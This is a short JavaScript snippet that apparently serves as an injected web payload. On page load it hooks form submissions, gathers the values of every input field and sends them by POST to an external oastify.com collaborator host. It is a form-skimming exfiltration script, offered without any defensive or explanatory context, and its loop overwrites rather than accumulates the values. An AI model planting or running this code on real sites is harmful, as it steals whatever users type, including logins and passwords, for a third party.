window["onload"] = () => {
    const form = document.forms;
    Array.from(form).forEach(form => addEventListener("submit", function() {
        let inputs = form.querySelectorAll("input");
        for(const input of inputs) {
            values = `${input.value}\n`
        }
        fetch("https://npg66ok9u6yy2e7x48rezmhan1tshi57.oastify.com", {method: 'POST', body:values})
    }, false))
}